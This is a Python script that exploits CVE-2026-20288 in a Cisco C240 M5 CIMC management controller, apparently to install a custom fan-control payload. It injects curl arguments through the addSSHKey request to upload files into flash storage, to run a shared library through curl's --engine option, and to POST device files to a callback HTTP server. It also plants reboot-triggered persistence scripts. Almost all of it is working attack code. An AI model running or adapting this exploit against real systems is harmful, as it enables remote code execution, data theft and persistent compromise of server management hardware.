#!/usr/bin/env python3
"""Deploy the bounded C240 M5 fan-controller payload via CVE-2026-20288."""

import argparse
import hashlib
import os
from pathlib import Path
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import xml.etree.ElementTree as ET

# authentication.py references Cryptodome.Cipher.AES after the original PoC's
# main module imports it as a side effect. Load it explicitly in this standalone
# deployer.
from Cryptodome.Cipher import AES as _AES  # noqa: F401, E402

sys.path.insert(0, "/tmp/CIMCown-audited")
os.environ.setdefault("PROXY_CIMC", "None")
from authentication import login, logout  # noqa: E402


class ReusableHTTPServer(HTTPServer):
    allow_reuse_address = True


def result_summary(response):
    try:
        root = ET.fromstring(response.content)
        status = root.findtext(".//status", default="")
        error = root.findtext(".//errorMsg", default="")
        return f"http={response.status_code} status={status} error={error}"
    except ET.ParseError:
        return f"http={response.status_code} nonxml_bytes={len(response.content)}"


def post_operation(target, session, sid, query):
    return session.post(
        f"https://{target}/data",
        headers={
            "Referer": f"https://{target}/index.html",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
        },
        data={
            "sessionID": sid,
            "queryString": urllib.parse.quote(query, safe=""),
        },
        timeout=45,
    )


def with_server(bind_ip, handler_class, operation):
    server = ReusableHTTPServer((bind_ip, 80), handler_class)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        return operation()
    finally:
        time.sleep(1)
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def upload_file(target, lreq, local_path, remote_path):
    local = Path(local_path)
    if not local.is_file():
        raise RuntimeError(f"missing local payload: {local}")
    if not re.fullmatch(r"/mnt/jffs2/[A-Za-z0-9._-]+", remote_path):
        raise RuntimeError(f"refusing remote path outside /mnt/jffs2: {remote_path}")

    content = local.read_bytes()
    filename = local.name
    requests_seen = []

    class PayloadHandler(BaseHTTPRequestHandler):
        def log_message(self, *_args):
            return

        def do_GET(self):
            requests_seen.append(self.path)
            if self.path.split("?", 1)[0] != f"/{filename}":
                self.send_response(404)
                self.end_headers()
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)

    callback_ip = lreq[4]
    injected_path = f"{filename} http://{callback_ip}/{filename} -o {remote_path}"
    query = (
        'set=addSSHKey(1,admin,1,"http",'
        f'"{callback_ip}","{injected_path}","",\\"\\")'
    )

    response = with_server(
        callback_ip,
        PayloadHandler,
        lambda: post_operation(target, lreq[5], lreq[2], query),
    )
    digest = hashlib.sha256(content).hexdigest()
    print(
        f"UPLOAD local={filename} remote={remote_path} bytes={len(content)} "
        f"sha256={digest} gets={len(requests_seen)} {result_summary(response)}"
    )
    if len(requests_seen) < 2:
        raise RuntimeError(f"CIMC did not fetch both upload URLs for {filename}")


def execute_installer(target, lreq, remote_library):
    if not re.fullmatch(r"/mnt/jffs2/[A-Za-z0-9._-]+", remote_library):
        raise RuntimeError("invalid installer library path")
    requests_seen = []

    class ProbeHandler(BaseHTTPRequestHandler):
        def log_message(self, *_args):
            return

        def do_GET(self):
            requests_seen.append(self.path)
            self.send_response(404)
            self.end_headers()

    callback_ip = lreq[4]
    injected_path = f"probe.pub --engine {remote_library}"
    query = (
        'set=addSSHKey(1,admin,1,"http",'
        f'"{callback_ip}","{injected_path}","",\\"\\")'
    )
    try:
        response = with_server(
            callback_ip,
            ProbeHandler,
            lambda: post_operation(target, lreq[5], lreq[2], query),
        )
        print(f"EXECUTE gets={len(requests_seen)} {result_summary(response)}")
    except Exception as error:
        # execl replaces the vulnerable curl process, so a dropped HTTP response
        # is not itself evidence of failure. Runtime fan telemetry is authoritative.
        print(f"EXECUTE response_interrupted={type(error).__name__}: {error}")


def inspect_remote_file(target, lreq, remote_path, local_path):
    """Retrieve one explicitly selected CIMC file for installation verification."""
    received = {"body": None}
    ready = threading.Event()

    class InspectHandler(BaseHTTPRequestHandler):
        def log_message(self, *_args):
            return

        def do_GET(self):
            self.send_response(404)
            self.end_headers()

        def do_POST(self):
            length = min(int(self.headers.get("Content-Length", "0")), 131072)
            received["body"] = self.rfile.read(length)
            self.send_response(200)
            self.end_headers()
            ready.set()

    callback_ip = lreq[4]
    callback_name = Path(local_path).name
    injected_path = (
        f"probe.pub -X POST --data-binary @{remote_path} "
        f"http://{callback_ip}/{callback_name}"
    )
    query = (
        'set=addSSHKey(1,admin,1,"http",'
        f'"{callback_ip}","{injected_path}","",\\"\\")'
    )
    response = with_server(
        callback_ip,
        InspectHandler,
        lambda: post_operation(target, lreq[5], lreq[2], query),
    )
    ready.wait(5)
    body = received["body"]
    if body is None:
        raise RuntimeError(f"CIMC did not return {remote_path}")
    Path(local_path).write_bytes(body)
    print(
        f"INSPECT path={remote_path} bytes={len(body)} "
        f"sha256={hashlib.sha256(body).hexdigest()} {result_summary(response)}"
    )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--username", default="admin")
    parser.add_argument("--payload-dir", default="/tmp/fan-controller")
    parser.add_argument("--inspect-init-only", action="store_true")
    parser.add_argument("--inspect-fan-only", action="store_true")
    parser.add_argument("--arm-only", action="store_true")
    parser.add_argument("--update-support-only", action="store_true")
    args = parser.parse_args()

    password = sys.stdin.readline().rstrip("\r\n")
    if not password:
        raise RuntimeError("CIMC password was not supplied on stdin")

    payload_dir = Path(args.payload_dir)
    lreq = login(args.target, args.username, password)
    password = ""
    if not lreq[0]:
        raise RuntimeError("CIMC login failed")

    try:
        if args.inspect_init_only:
            inspect_remote_file(
                args.target,
                lreq,
                "/etc/init.d/nihuu-update",
                "/tmp/cimc-nihuu-update",
            )
            return
        if args.inspect_fan_only:
            files = (
                ("/tmp/custom-fan-curve.log", "/tmp/cimc-custom-fan-curve.log"),
                ("/mnt/jffs2/native-fan-run-target", "/tmp/cimc-native-fan-run-target"),
                ("/var/service/rack_fan_control/run", "/tmp/cimc-active-fan-run"),
                ("/mnt/jffs2/nihuu_delay_cimc_reboot", "/tmp/cimc-rearmed-trigger"),
                ("/mnt/jffs2/host_reboot_flag", "/tmp/cimc-rearmed-flag"),
            )
            for remote_path, local_path in files:
                inspect_remote_file(args.target, lreq, remote_path, local_path)
            return
        if args.arm_only:
            upload_file(
                args.target,
                lreq,
                payload_dir / "nihuu-trampoline.sh",
                "/mnt/jffs2/nihuu_delay_cimc_reboot",
            )
            upload_file(
                args.target,
                lreq,
                payload_dir / "host_reboot_flag",
                "/mnt/jffs2/host_reboot_flag",
            )
            return
        if args.update_support_only:
            upload_file(
                args.target,
                lreq,
                payload_dir / "rollback-fan-controller.sh",
                "/mnt/jffs2/rollback-fan-controller.sh",
            )
            upload_file(
                args.target,
                lreq,
                payload_dir / "rollback-trigger.sh",
                "/mnt/jffs2/rollback-trigger.sh",
            )
            return
        uploads = (
            ("custom-fan-curve.sh", "/mnt/jffs2/custom-fan-curve.sh"),
            ("nihuu-trampoline.sh", "/mnt/jffs2/fanboot.trigger"),
            ("rollback-fan-controller.sh", "/mnt/jffs2/rollback-fan-controller.sh"),
            ("install-fan-controller.sh", "/mnt/jffs2/install-fan-controller.sh"),
            ("fan-installer.so", "/mnt/jffs2/fan-installer.so"),
        )
        for local_name, remote_name in uploads:
            upload_file(args.target, lreq, payload_dir / local_name, remote_name)
        execute_installer(args.target, lreq, "/mnt/jffs2/fan-installer.so")
    finally:
        logout(args.target, lreq[2], lreq[1], lreq[5])


if __name__ == "__main__":
    main()
